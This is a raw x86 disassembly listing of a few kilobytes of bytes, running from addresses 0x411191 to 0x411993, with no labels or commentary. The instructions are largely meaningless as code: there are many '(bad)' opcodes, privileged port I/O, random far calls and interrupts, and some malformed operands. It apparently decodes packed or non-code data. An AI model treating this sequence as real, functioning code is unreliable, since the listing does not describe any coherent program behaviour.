  411191:	shr    DWORD PTR [eax-0x1b],0x59
  411195:	sub    eax,0x5dd8d7c
  41119a:	test   eax,0xd1868408
  41119f:	push   ebx
  4111a0:	sbb    DWORD PTR [edx-0x2a],esp
  4111a3:	inc    edx
  4111a4:	or     DWORD PTR [edi-0x684af88c],0xffffffc8
  4111ab:	fs aas 
  4111ad:	cwde   
  4111ae:	inc    esi
  4111af:	xor    al,0x87
  4111b1:	xchg   esp,eax
  4111b2:	sbb    DWORD PTR [esi+0x29],0x9b107b3a
  4111b9:	push   cs
  4111ba:	jg     0x4111f6
  4111bc:	fst    QWORD PTR [edx]
  4111be:	imul   esi,DWORD PTR [esi],0xffffffa7
  4111c1:	call   0xcf12943
  4111c6:	arpl   bx,dx
  4111c8:	retf   
  4111c9:	mov    al,ds:0x9d9ea09a
  4111ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111cf:	out    0xe7,al
  4111d1:	pop    es
  4111d2:	test   al,0x80
  4111d4:	lea    ebp,ds:0xab46d4d5
  4111da:	rcl    BYTE PTR [ecx-0x64],0x38
  4111de:	popa   
  4111df:	outs   dx,BYTE PTR ds:[esi]
  4111e0:	(bad)  
  4111e1:	outs   dx,DWORD PTR ds:[esi]
  4111e2:	repnz nop
  4111e4:	pop    eax
  4111e5:	cdq    
  4111e6:	jns    0x41121c
  4111e8:	ss dec esp
  4111ea:	inc    eax
  4111eb:	jo     0x411205
  4111ed:	mov    BYTE PTR [esi],ah
  4111ef:	(bad)  
  4111f1:	mov    ds:0x910bcfb9,al
  4111f6:	mov    ebp,0x3fcc27b
  4111fb:	mov    edx,0x90a81c76
  411200:	cdq    
  411201:	sar    DWORD PTR [edi+edi*4+0x35],1
  411205:	sub    BYTE PTR ds:0xe3695c61,cl
  41120b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41120c:	pop    ss
  41120d:	enter  0x9348,0x66
  411211:	call   0xbc9e:0xdb531b58
  411218:	mov    al,0xe5
  41121a:	jne    0x4111e4
  41121c:	cld    
  41121d:	inc    edx
  41121e:	dec    ecx
  41121f:	and    edx,DWORD PTR [ebp+0x58]
  411222:	jae    0x4111c8
  411224:	int    0x3b
  411226:	push   cs
  411227:	imul   edx,DWORD PTR [eax-0x5de477f8],0xd87c4da2
  411231:	jnp    0x41128b
  411233:	dec    edi
  411234:	pop    es
  411235:	pop    es
  411236:	or     eax,0x75e3ef60
  41123b:	sbb    eax,0xdb37da3d
  411240:	sbb    al,0xc8
  411242:	fistp  WORD PTR [ecx+0x2c7ce100]
  411248:	stc    
  411249:	sbb    DWORD PTR [ebp+0x5f],eax
  41124c:	(bad)  
  41124d:	or     edx,DWORD PTR [ebx]
  41124f:	loop   0x41126d
  411251:	sub    DWORD PTR [edx-0x5c],eax
  411254:	sub    DWORD PTR [ebx+eax*1+0x8d0b648],eax
  41125b:	fdiv   st,st(6)
  41125d:	push   edi
  41125e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41125f:	jmp    0x32da23a7
  411264:	gs ins BYTE PTR es:[edi],dx
  411266:	mov    ebx,0x87c8c158
  41126b:	mov    ebx,0xb3f1f3b7
  411270:	mov    WORD PTR [eax+0x1474655e],fs
  411276:	xor    eax,0x5386e09e
  41127b:	pop    edx
  41127c:	stc    
  41127d:	cmp    bl,dh
  41127f:	ficomp WORD PTR [ecx]
  411281:	das    
  411282:	xor    al,0x9b
  411284:	mov    gs,WORD PTR [edi]
  411286:	int3   
  411287:	inc    edx
  411288:	(bad)  
  41128a:	adc    dl,dh
  41128c:	pushf  
  41128d:	aas    
  41128e:	sub    edi,DWORD PTR [edi-0xc72d459]
  411294:	arpl   WORD PTR [ecx+0x7b9f22b5],di
  41129a:	push   0xffffff84
  41129c:	push   eax
  41129d:	outs   dx,DWORD PTR ds:[esi]
  41129e:	add    ebp,ebp
  4112a0:	jne    0x41128b
  4112a2:	mov    al,ds:0x521c6cc2
  4112a7:	shl    BYTE PTR [ebp+0x36],0x7c
  4112ab:	cmp    DWORD PTR [edi],0xd08532bd
  4112b1:	outs   dx,BYTE PTR ds:[esi]
  4112b2:	test   al,0x90
  4112b4:	cmp    eax,0x3586c1ff
  4112b9:	fwait
  4112ba:	mov    bl,0x22
  4112bc:	mov    ah,0x18
  4112be:	mov    ebx,0x281fff1f
  4112c3:	sahf   
  4112c4:	mov    ebx,0x8ef64be6
  4112c9:	dec    ebx
  4112ca:	mov    ebp,0xe3cb8095
  4112cf:	in     eax,dx
  4112d0:	(bad)  
  4112d2:	mov    ebx,0x1f2de81f
  4112d7:	and    al,0xd3
  4112d9:	imul   DWORD PTR [eax]
  4112db:	dec    edx
  4112dc:	xor    dl,dh
  4112de:	repz loop 0x41133e
  4112e1:	jmp    0xa071:0x36ed5cda
  4112e8:	test   eax,0xfb5f3372
  4112ed:	cdq    
  4112ee:	or     esp,DWORD PTR [eax+0x5c]
  4112f1:	jmp    DWORD PTR [esi]
  4112f3:	xor    dh,ah
  4112f5:	mov    ebp,0x61eb2a00
  4112fa:	add    edi,edi
  4112fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112fd:	aaa    
  4112fe:	add    al,0x5e
  411300:	xor    dh,BYTE PTR [eax]
  411302:	sub    al,0x60
  411304:	mov    esp,0x6cfd2e82
  411309:	xchg   esp,eax
  41130a:	push   ss
  41130b:	arpl   WORD PTR [eax+0x69],bp
  41130e:	jns    0x411377
  411310:	mov    bl,0x21
  411312:	push   edx
  411313:	mov    esi,0x5fe7713e
  411318:	je     0x4112f0
  41131a:	rol    BYTE PTR [esi],1
  41131c:	sub    edx,esi
  41131e:	aas    
  41131f:	in     eax,dx
  411320:	jge    0x411392
  411322:	jno    0x411384
  411324:	pop    edx
  411325:	mov    ds:0x8aaf0777,al
  41132a:	xor    al,0xc4
  41132c:	push   ebp
  41132d:	mov    esp,0x12cac94d
  411332:	inc    esi
  411333:	cmp    eax,0x2ddf5c39
  411338:	mov    edx,0x4297fac9
  41133d:	adc    al,0x94
  411340:	lds    ecx,FWORD PTR [ecx+esi*8]
  411343:	(bad)  
  411344:	in     eax,dx
  411345:	fwait
  411346:	adc    eax,0x539f10d7
  41134b:	(bad)  
  41134c:	leave  
  41134d:	push   0xffffffae
  41134f:	pop    es
  411350:	jge    0x4112f1
  411352:	popf   
  411353:	dec    edi
  411354:	std    
  411355:	adc    BYTE PTR [ebp+0x35c44194],ah
  41135b:	je     0x4112f7
  41135d:	dec    esp
  41135e:	jo     0x411329
  411360:	enter  0xc2af,0xa7
  411364:	loop   0x4113c8
  411366:	ret    0x55c8
  411369:	cmp    dh,BYTE PTR [esi-0x4106a4fe]
  41136f:	dec    edi
  411370:	add    edx,DWORD PTR [bx+di]
  411373:	mov    cl,0x39
  411375:	mov    bl,0x5e
  411377:	push   ebx
  411378:	std    
  411379:	pop    esi
  41137a:	xchg   esp,eax
  41137b:	xor    al,0xe5
  41137d:	push   es
  41137e:	push   edx
  41137f:	mov    dh,0x25
  411381:	dec    edi
  411382:	call   0xda16:0xd84f5478
  411389:	imul   esp,DWORD PTR [esi],0x9825f275
  41138f:	push   ds
  411390:	push   edi
  411391:	lods   eax,DWORD PTR ds:[esi]
  411392:	(bad)  
  411393:	push   ecx
  411394:	in     eax,0xbe
  411396:	mov    DWORD PTR [eax-0x23],ebp
  411399:	dec    edi
  41139a:	push   ebp
  41139b:	inc    eax
  41139c:	mov    ecx,0x8cc2675b
  4113a1:	push   ds
  4113a2:	shr    ebx,1
  4113a4:	dec    edx
  4113a5:	test   eax,0xbc897e3c
  4113aa:	test   al,0x5f
  4113ac:	and    al,0x6f
  4113ae:	mov    ds:0x71f5083a,al
  4113b3:	mov    ds:0xbeb0aabf,al
  4113b8:	mov    ecx,0xb0ab329b
  4113bd:	mov    es,WORD PTR [esi-0x6079003]
  4113c3:	enter  0x2882,0xa5
  4113c7:	cld    
  4113c8:	neg    al
  4113ca:	push   es
  4113cb:	in     al,0x4f
  4113cd:	std    
  4113ce:	(bad)  
  4113cf:	or     BYTE PTR [ebx+eiz*1-0x47],bh
  4113d3:	jmp    0x41139c
  4113d5:	or     eax,0xf89b687d
  4113da:	mul    DWORD PTR [ebp-0x6bfd974e]
  4113e0:	mov    bl,0x5c
  4113e2:	or     al,0xfe
  4113e4:	xchg   DWORD PTR [edi],ebp
  4113e6:	jb     0x4113cd
  4113e8:	cmp    al,0x2c
  4113ea:	call   0x48fc58f7
  4113ef:	les    edx,FWORD PTR [eax+esi*4]
  4113f2:	xchg   ebp,eax
  4113f3:	loop   0x411461
  4113f5:	jge    0x411435
  4113f7:	addr16 jnp 0x41146f
  4113fa:	and    al,0xc1
  4113fc:	push   ebp
  4113fd:	cmp    cl,0x70
  411400:	push   DWORD PTR [ecx]
  411402:	dec    esp
  411403:	pushf  
  411404:	push   ebx
  411405:	bound  ecx,QWORD PTR [eax]
  411407:	inc    ecx
  411408:	ss aaa 
  41140a:	(bad)  
  41140b:	sub    eax,0xfc03e3f5
  411410:	pop    ecx
  411411:	xchg   esi,eax
  411412:	lahf   
  411413:	fs sub bl,ah
  411416:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411417:	(bad)  [ebx+0x4c]
  41141a:	js     0x411461
  41141c:	test   DWORD PTR [ebp-0x25],ebp
  41141f:	sbb    esp,DWORD PTR [ecx+0x29]
  411422:	scas   al,BYTE PTR es:[edi]
  411423:	(bad)  
  411424:	out    0x21,al
  411426:	xchg   esp,eax
  411427:	xchg   esi,eax
  411428:	add    al,0x7d
  41142a:	clc    
  41142b:	arpl   WORD PTR [edi-0x39d14afc],bp
  411431:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  411433:	mov    WORD PTR [ecx-0x77a6cfa],fs
  411439:	lock mov ecx,0x22a8f179
  411440:	mov    edx,DWORD PTR es:[eax-0x7d]
  411444:	test   DWORD PTR [edx],ebx
  411446:	cmp    ebp,ebp
  411448:	cmp    al,0x17
  41144a:	xchg   ecx,eax
  41144b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41144c:	dec    ecx
  41144d:	push   edx
  41144e:	repz dec ebp
  411450:	ja     0x41149f
  411452:	test   BYTE PTR [eax+0x31],cl
  411455:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411456:	into   
  411457:	push   eax
  411458:	clc    
  411459:	dec    edi
  41145a:	fst    QWORD PTR [ebx+0x13f4a448]
  411460:	in     al,0x96
  411462:	inc    esp
  411463:	retf   0x6c11
  411466:	ret    
  411467:	jae    0x411419
  411469:	jo     0x41149a
  41146b:	mov    ss,WORD PTR [edx+0x76fb8dd6]
  411471:	jnp    0x4114a8
  411473:	test   dh,bh
  411475:	ds xchg esp,ebp
  411478:	cwde   
  411479:	sbb    BYTE PTR [ebx-0x7bd3bd40],bh
  41147f:	sub    edx,DWORD PTR [ebp+0x10]
  411482:	push   edi
  411483:	in     eax,dx
  411484:	adc    BYTE PTR [edx+0x18],ah
  411487:	fucomip st,st(6)
  411489:	mov    dh,BYTE PTR [ecx-0x18]
  41148c:	(bad)  
  41148d:	mov    eax,ds:0x15706d8b
  411492:	jmp    0x3b93a841
  411497:	jo     0x4114a4
  411499:	push   ebx
  41149a:	pusha  
  41149b:	cmp    bl,dh
  41149d:	jne    0x411476
  41149f:	mov    ebp,0xc2175532
  4114a4:	mov    fs:0xf581850c,al
  4114aa:	dec    edi
  4114ab:	mov    WORD PTR [esi+0x5bb69dc],es
  4114b1:	pop    eax
  4114b2:	sbb    BYTE PTR [ebx],dl
  4114b4:	ret    
  4114b5:	mov    ebp,0x8cc02e01
  4114ba:	cmp    ebx,DWORD PTR [ecx+0x37]
  4114bd:	ret    
  4114be:	inc    ecx
  4114bf:	in     al,0x18
  4114c1:	push   es
  4114c2:	nop
  4114c3:	mov    ebp,0x45c360f5
  4114c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114c9:	int    0xd0
  4114cb:	not    ebx
  4114cd:	lahf   
  4114ce:	test   eax,0xd2604292
  4114d3:	test   BYTE PTR [edx],dl
  4114d5:	mov    bl,0x79
  4114d7:	test   DWORD PTR [edx+0x32d6a6ad],0x30984786
  4114e1:	adc    dh,BYTE PTR [ecx]
  4114e3:	out    0xcb,al
  4114e5:	jg     0x4114a1
  4114e7:	out    dx,eax
  4114e8:	mov    ?,edi
  4114ea:	sub    DWORD PTR [edx+ebp*1-0x3d],esi
  4114ee:	jp     0x4114e8
  4114f0:	pop    es
  4114f1:	je     0x411519
  4114f3:	imul   edi,DWORD PTR [ecx],0xcf16b744
  4114f9:	fcomip st,st(5)
  4114fb:	lds    edx,FWORD PTR [ecx]
  4114fd:	(bad)  
  4114fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114ff:	sbb    bh,BYTE PTR [ecx-0x51]
  411502:	sub    eax,0x5ed2616
  411507:	or     BYTE PTR [edi],dl
  411509:	mov    bl,0x55
  41150b:	jecxz  0x41149a
  41150d:	popa   
  41150e:	rol    ah,0x45
  411511:	sbb    dh,dl
  411513:	inc    edx
  411514:	fldcw  WORD PTR [ecx-0x31]
  411517:	inc    ecx
  411518:	rcl    DWORD PTR [ebx],0x19
  41151b:	nop
  41151c:	jle    0x4114e5
  41151e:	int3   
  41151f:	nop
  411520:	nop    DWORD PTR [eax-0x6f]
  411524:	jl     0x411518
  411526:	inc    ebx
  411527:	xchg   edi,eax
  411528:	jne    0x41151f
  41152a:	(bad)
  41152e:	push   ds
  41152f:	add    ah,bh
  411531:	lea    ebx,[ecx+0x557304c4]
  411537:	(bad)  
  411538:	pushf  
  411539:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41153a:	aam    0x83
  41153c:	gs imul edi,ebx,0xffffffdc
  411540:	fisub  WORD PTR [ebx-0x6e961d0f]
  411546:	mov    gs:0x23333838,al
  41154c:	lock cmp eax,0x7c9e3ff8
  411552:	adc    cl,ah
  411554:	out    0xdc,al
  411556:	push   ss
  411557:	mov    cl,bh
  411559:	int    0xa6
  41155b:	and    al,0xe4
  41155d:	ret    0xd32e
  411560:	mov    esi,0x6d7ebab6
  411565:	push   cs
  411566:	ins    BYTE PTR es:[edi],dx
  411567:	outs   dx,BYTE PTR ds:[esi]
  411568:	je     0x41151f
  41156a:	repnz mov al,0x1c
  41156d:	sar    esp,1
  41156f:	ins    DWORD PTR es:[edi],dx
  411570:	cli    
  411571:	test   DWORD PTR [ebp-0x18a17a71],edx
  411577:	inc    DWORD PTR [ebx+edx*4+0x2ce29838]
  41157e:	bnd ret 
  411580:	jg     0x411524
  411582:	ss and al,0xff
  411585:	push   ebp
  411586:	xchg   BYTE PTR [edi],cl
  411588:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411589:	xchg   esi,eax
  41158a:	pusha  
  41158b:	repz scas al,BYTE PTR es:[edi]
  41158d:	cmp    eax,0x4c468c0d
  411592:	cmp    BYTE PTR [ecx+0x76a9b1ef],0xf0
  411599:	enter  0x7e4a,0xb6
  41159d:	dec    ebp
  41159e:	rcl    DWORD PTR [ecx-0x6eb5190e],1
  4115a4:	or     al,0x68
  4115a6:	jbe    0x411611
  4115a8:	nop
  4115a9:	sbb    BYTE PTR [esi-0x4d],0x83
  4115ad:	push   ecx
  4115ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115af:	rol    BYTE PTR [edi],cl
  4115b1:	ret    
  4115b2:	jle    0x411582
  4115b4:	mov    WORD PTR [edx*8+0x54110618],cs
  4115bb:	es in  al,dx
  4115bd:	add    edx,DWORD PTR [ebx]
  4115bf:	xor    esi,DWORD PTR [ecx]
  4115c1:	push   ss
  4115c2:	pusha  
  4115c3:	ss out 0x3f,eax
  4115c6:	jmp    0x752:0x75478d40
  4115cd:	add    DWORD PTR [esi+0xfee1004],ebx
  4115d3:	dec    ecx
  4115d4:	or     al,0xe
  4115d6:	test   al,0xcc
  4115d8:	push   ss
  4115d9:	cdq    
  4115da:	mov    bl,0x9f
  4115dc:	push   edx
  4115dd:	call   0x36f6d18f
  4115e2:	sbb    al,0x16
  4115e4:	das    
  4115e5:	mov    bh,0x3f
  4115e7:	int3   
  4115e8:	push   eax
  4115e9:	and    DWORD PTR [esi+0x79f0ce0e],0xffffff81
  4115f0:	xchg   edx,eax
  4115f1:	adc    DWORD PTR [ebx+ecx*1-0x2],ecx
  4115f5:	sbb    ebp,esp
  4115f7:	jecxz  0x4115dd
  4115f9:	xchg   esi,eax
  4115fa:	hlt    
  4115fb:	je     0x411631
  4115fd:	out    0xfc,al
  4115ff:	out    0x96,eax
  411601:	or     al,0x3f
  411603:	fwait
  411604:	stc    
  411605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411606:	or     al,0x24
  411608:	sub    edi,ecx
  41160a:	sbb    DWORD PTR [edx],ecx
  41160c:	sub    DWORD PTR [ebx-0x34],eax
  41160f:	push   0x9f18697f
  411614:	jno    0x4115c1
  411616:	add    BYTE PTR [edi],bl
  411618:	xor    ch,BYTE PTR [ebp+0x74]
  41161b:	mov    cl,0xd1
  41161d:	mul    bl
  41161f:	retf   0x33af
  411622:	das    
  411623:	cmp    edx,ebx
  411625:	in     al,0x9e
  411627:	cmp    DWORD PTR [ebx],ebp
  411629:	pop    es
  41162a:	sbb    ch,BYTE PTR [edi]
  41162c:	pop    edx
  41162d:	lods   al,BYTE PTR ds:[esi]
  41162e:	cld    
  41162f:	out    dx,al
  411630:	adc    al,0x81
  411632:	iret   
  411633:	sar    BYTE PTR [ebp+0x54],1
  411636:	inc    edi
  411637:	scas   al,BYTE PTR es:[edi]
  411638:	call   0x78b:0xd9637394
  41163f:	shr    DWORD PTR [eax],0x64
  411642:	sbb    al,0xca
  411644:	push   ds
  411645:	pop    eax
  411646:	pop    ebp
  411647:	sbb    DWORD PTR [ecx+ebp*4+0x4a],edx
  41164b:	sub    ecx,DWORD PTR [edx]
  41164d:	mov    edx,0x108f0970
  411652:	pushf  
  411653:	icebp  
  411654:	and    DWORD PTR [edi+0x31a6320c],ebx
  41165a:	push   eax
  41165b:	fild   WORD PTR [esi+0x3237f5fc]
  411661:	mov    BYTE PTR [ebp+0x68b46eae],al
  411667:	xor    BYTE PTR [edi],al
  411669:	fsubr  st,st(6)
  41166b:	imul   edx,DWORD PTR [edx],0xb03a7485
  411671:	lods   al,BYTE PTR ds:[esi]
  411672:	mov    ebp,0xbdcde269
  411677:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411678:	xor    al,0x8f
  41167a:	mov    eax,ds:0x247eef5
  41167f:	jno    0x411656
  411681:	and    al,0xde
  411683:	jp     0x411609
  411685:	push   es
  411686:	stc    
  411687:	popa   
  411688:	rcl    BYTE PTR [edx],cl
  41168a:	push   edx
  41168b:	fbld   TBYTE PTR [ebx]
  41168d:	jl     0x4116b4
  41168f:	in     eax,dx
  411690:	xchg   edx,eax
  411691:	ficom  DWORD PTR [edi-0x11]
  411694:	inc    WORD PTR [eax-0x4c9ee50f]
  41169b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41169c:	xchg   ebp,eax
  41169d:	enter  0x47d3,0x5
  4116a1:	ret    
  4116a2:	out    0x37,al
  4116a4:	cmp    al,0x32
  4116a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116a7:	cmp    al,BYTE PTR [ecx]
  4116a9:	push   0xffffff9f
  4116ab:	pop    esi
  4116ac:	jbe    0x411704
  4116ae:	(bad)  
  4116af:	(bad)  
  4116b0:	aam    0xd9
  4116b2:	jecxz  0x411707
  4116b4:	dec    eax
  4116b5:	jg     0x4116a0
  4116b7:	repz pop edx
  4116b9:	and    dh,ah
  4116bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116bc:	mov    ch,0x2a
  4116be:	and    cl,BYTE PTR [ecx-0x12223765]
  4116c4:	ins    DWORD PTR es:[edi],dx
  4116c5:	add    bh,BYTE PTR [esi]
  4116c7:	pop    ebp
  4116c8:	jmp    0x962e:0x3060878d
  4116cf:	aam    0x4e
  4116d1:	(bad)  
  4116d2:	jmp    0x41173f
  4116d4:	xor    al,0x8c
  4116d6:	ja     0x41170f
  4116d8:	lock je 0x4116c7
  4116db:	sar    BYTE PTR [ebx-0x2df9e0bb],1
  4116e1:	inc    ebx
  4116e2:	jge    0x41167c
  4116e4:	push   eax
  4116e5:	test   dl,dh
  4116e7:	pop    ss
  4116e8:	lock mov ah,0x38
  4116eb:	mov    ds:0xb95bc186,al
  4116f0:	mov    ebp,DWORD PTR [edx+0x24805c76]
  4116f6:	sbb    dh,bh
  4116f8:	mov    esi,0xde4a92d
  4116fd:	imul   esp,DWORD PTR ds:0xc3ecf15d,0xd
  411704:	mov    esp,0x77db5128
  411709:	adc    DWORD PTR ds:0xfa229b1d,ebx
  41170f:	fldenv [edi-0xa428b42]
  411715:	ret    0x77ed
  411718:	adc    DWORD PTR [edx-0x3a],edi
  41171b:	cmc    
  41171c:	and    DWORD PTR [ebx+0xed023d6],0x65fb37d0
  411726:	add    dh,cl
  411728:	push   0x70da3611
  41172d:	sbb    eax,0xfaa92edf
  411732:	sub    DWORD PTR [ebp-0x551a62b6],eax
  411738:	pop    ebx
  411739:	and    ecx,DWORD PTR [edi+ebx*8-0x38753169]
  411740:	js     0x4116cb
  411742:	mov    WORD PTR [esi+eiz*8],ds
  411745:	and    al,0xc7
  411747:	test   eax,0xa0c71ac6
  41174c:	bound  ebp,QWORD PTR [eax+0x34]
  41174f:	jno    0x4117a7
  411751:	test   DWORD PTR [edi+0x53],0xb5f34a8f
  411758:	aaa    
  411759:	or     edi,ecx
  41175b:	jne    0x4117c0
  41175d:	or     al,0x96
  41175f:	lods   eax,DWORD PTR ds:[esi]
  411760:	scas   al,BYTE PTR es:[edi]
  411761:	gs dec eax
  411763:	test   edi,0x6de1f7c3
  411769:	xchg   ebx,eax
  41176a:	add    esp,DWORD PTR [eax+0x2a]
  41176d:	sbb    esi,0x70c98e1d
  411773:	jp     0x4117a3
  411775:	rol    dh,1
  411777:	or     DWORD PTR [esi+0x35b82f4],0x3f8919d0
  411781:	sar    bh,cl
  411783:	push   ds
  411784:	call   0x25a3:0x2593404a
  41178b:	aad    0x14
  41178d:	jnp    0x411725
  41178f:	pop    ebp
  411790:	les    edx,FWORD PTR [edi-0x5dbae3b6]
  411796:	popf   
  411797:	lea    ebp,[esi+ebp*8]
  41179a:	and    ah,BYTE PTR [eax]
  41179c:	lods   eax,DWORD PTR ds:[esi]
  41179d:	mov    esp,0xa87245cb
  4117a2:	mov    ds:0x48b00964,eax
  4117a7:	jmp    0xa3d5:0x32c0476f
  4117ae:	sub    al,cl
  4117b0:	add    BYTE PTR [edi-0xcc5b27e],0xca
  4117b7:	je     0x41177b
  4117b9:	popa   
  4117ba:	loope  0x411793
  4117bc:	adc    eax,0x84ee1715
  4117c1:	repnz sbb al,0x2e
  4117c4:	iret   
  4117c5:	cmp    BYTE PTR [esi],0xe9
  4117c8:	xchg   esi,eax
  4117c9:	jmp    0xa147:0x373a16bf
  4117d0:	stos   DWORD PTR es:[edi],eax
  4117d1:	ds clc 
  4117d3:	xor    BYTE PTR [esi-0x1b9ff716],bl
  4117d9:	out    dx,eax
  4117da:	jae    0x41177a
  4117dc:	xchg   esp,eax
  4117dd:	outs   dx,DWORD PTR ds:[esi]
  4117de:	mov    edx,0xc542533d
  4117e3:	scas   al,BYTE PTR es:[edi]
  4117e4:	call   0x79246b36
  4117e9:	fbld   TBYTE PTR cs:[ebx+0x17e38587]
  4117f0:	shl    DWORD PTR [eax-0x11],1
  4117f3:	ss int3 
  4117f5:	test   al,0xbb
  4117f7:	repz mov bl,0x16
  4117fa:	xor    eax,0x594a20d5
  4117ff:	stc    
  411800:	inc    edi
  411801:	or     al,0x89
  411803:	fxch   st(4)
  411805:	lahf   
  411806:	sub    eax,0x851781e
  41180b:	(bad)  
  41180c:	data16 xchg BYTE PTR [edi-0x51],dh
  411810:	xor    cl,BYTE PTR [ebp-0x784a76af]
  411816:	cmp    DWORD PTR [ebx+0x79b91856],eax
  41181c:	iret   
  41181d:	iret   
  41181e:	push   ecx
  41181f:	mov    bh,0x4f
  411821:	inc    esp
  411822:	dec    ebp
  411823:	int3   
  411824:	dec    edi
  411825:	in     al,dx
  411826:	jle    0x41188a
  411828:	and    eax,0xb6c1b28d
  41182d:	aam    0xfc
  41182f:	push   ecx
  411830:	std    
  411831:	adc    eax,DWORD PTR [edi-0x1e34e8cc]
  411837:	js     0x41185f
  411839:	push   cs
  41183a:	mov    eax,ds:0xdd400520
  41183f:	mov    edi,DWORD PTR [eax]
  411841:	cmp    DWORD PTR [esi],edx
  411843:	push   eax
  411844:	push   cs
  411845:	popf   
  411846:	repz call 0x559017a1
  41184c:	outs   dx,DWORD PTR ds:[esi]
  41184d:	jo     0x411807
  41184f:	ret    
  411850:	xchg   ebp,eax
  411851:	in     eax,dx
  411852:	jmp    FWORD PTR [esi+ebp*1-0x6d5c834b]
  411859:	in     al,0x9d
  41185b:	inc    ecx
  41185c:	inc    edx
  41185d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41185e:	sahf   
  41185f:	and    dl,BYTE PTR [ecx-0x3d5d98cd]
  411865:	ins    BYTE PTR es:[edi],dx
  411866:	rol    cl,0xac
  411869:	adc    eax,0x31dd21ab
  41186e:	push   edx
  41186f:	add    al,BYTE PTR [ecx+edx*2+0x2a14b537]
  411876:	push   ss
  411877:	pop    edi
  411878:	mov    dh,0x7
  41187a:	push   edx
  41187b:	rcr    BYTE PTR [ecx-0x9],1
  41187e:	pusha  
  41187f:	lahf   
  411880:	jle    0x4118bd
  411882:	adc    DWORD PTR [edx+0x1a5624de],ebx
  411888:	jle    0x41182d
  41188a:	inc    edi
  41188b:	ret    
  41188c:	mov    ecx,0x3b9273f9
  411891:	and    BYTE PTR [ebx+0xac670dc],0x8e
  411898:	add    DWORD PTR ds:0x3cbf2277,edi
  41189e:	pop    ebp
  41189f:	leave  
  4118a0:	ret    0x7003
  4118a3:	shl    BYTE PTR [esi-0x4930250f],0xe5
  4118aa:	pushf  
  4118ab:	mov    eax,0xf2263633
  4118b0:	sar    BYTE PTR [edx-0x444d1636],0xa2
  4118b7:	push   ebx
  4118b8:	sahf   
  4118b9:	jle    0x4118f8
  4118bb:	sbb    al,0xdb
  4118bd:	jne    0x4118f7
  4118bf:	sbb    ebx,DWORD PTR [ebx+0x619803d1]
  4118c5:	pop    ebx
  4118c6:	call   0x2716:0x68018ea1
  4118cd:	push   esp
  4118ce:	add    eax,0xe6ce79a9
  4118d3:	inc    edx
  4118d4:	jecxz  0x4118ad
  4118d6:	aaa    
  4118d7:	jns    0x4118c4
  4118d9:	pop    ds
  4118da:	or     ch,BYTE PTR [ecx+0x28]
  4118dd:	mov    eax,0x2d7c6637
  4118e2:	xor    DWORD PTR [esi],ebx
  4118e4:	popa   
  4118e5:	dec    ecx
  4118e6:	cmp    cl,BYTE PTR [ebx+0x33]
  4118e9:	lahf   
  4118ea:	push   ecx
  4118eb:	push   ebp
  4118ec:	in     al,0x8
  4118ee:	and    ch,BYTE PTR [edi+0x1e]
  4118f1:	in     al,0xf8
  4118f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118f4:	in     al,0xac
  4118f6:	(bad)  
  4118f8:	lods   eax,DWORD PTR ds:[esi]
  4118f9:	das    
  4118fa:	cdq    
  4118fb:	sub    BYTE PTR ss:[edi],cl
  4118fe:	sub    al,0x8a
  411900:	cdq    
  411901:	xlat   BYTE PTR ds:[ebx]
  411902:	into   
  411903:	add    eax,0x190a373e
  411908:	push   eax
  411909:	pop    esi
  41190a:	jne    0x4118f3
  41190c:	or     DWORD PTR [edi],0x5c
  41190f:	xchg   ebx,eax
  411910:	sbb    al,BYTE PTR [ecx-0x6c]
  411913:	push   edi
  411914:	push   esi
  411915:	or     al,0xdd
  411917:	mov    BYTE PTR [ebx-0x24a41c67],ch
  41191d:	(bad)  
  41191e:	ja     0x41197b
  411920:	(bad)  
  411921:	int    0x4e
  411923:	jmp    0x41195f
  411925:	mov    dh,0x7
  411927:	add    al,0x59
  411929:	sub    ah,BYTE PTR [edi]
  41192b:	(bad)  
  41192c:	fstp   QWORD PTR [ebx-0x5c]
  41192f:	mov    bh,0x3a
  411931:	xlat   BYTE PTR ds:[ebx]
  411932:	mov    ebp,0x7692d05e
  411937:	adc    BYTE PTR [ecx+0x2a],0xc5
  41193b:	xlat   BYTE PTR ds:[ebx]
  41193c:	xlat   BYTE PTR ds:[ebx]
  41193d:	mov    BYTE PTR ds:0x1b00da08,ch
  411943:	aas    
  411944:	es mov eax,0x742e987e
  41194a:	push   eax
  41194b:	test   BYTE PTR [edx-0x51c5c1f0],bh
  411951:	mov    eax,0xa0e56a27
  411956:	mov    ebx,?
  411958:	fsubr  QWORD PTR [ecx-0x34]
  41195b:	or     DWORD PTR [edi+0x979f263],ebx
  411961:	retf   0xe7cd
  411964:	jae    0x4118f5
  411966:	jp     0x411951
  411968:	out    0x4d,eax
  41196a:	scas   eax,DWORD PTR es:[edi]
  41196b:	shr    esi,1
  41196d:	add    eax,0xf14f7011
  411972:	sbb    dh,BYTE PTR [edi+0x49]
  411975:	js     0x4119d2
  411977:	gs push ds
  411979:	icebp  
  41197a:	pop    es
  41197b:	shl    BYTE PTR [ebp-0x4fd64112],cl
  411981:	cmp    al,0x5b
  411983:	sbb    DWORD PTR [esp+esi*1],edx
  411986:	outs   dx,BYTE PTR ds:[esi]
  411987:	and    eax,0xa42570a
  41198c:	pop    ss
  41198d:	push   edx
  41198e:	out    dx,eax
  41198f:	cs loopne 0x4119f7
  411992:	clc    
  411993:	bound  ebx,QWORD PTR [edx]
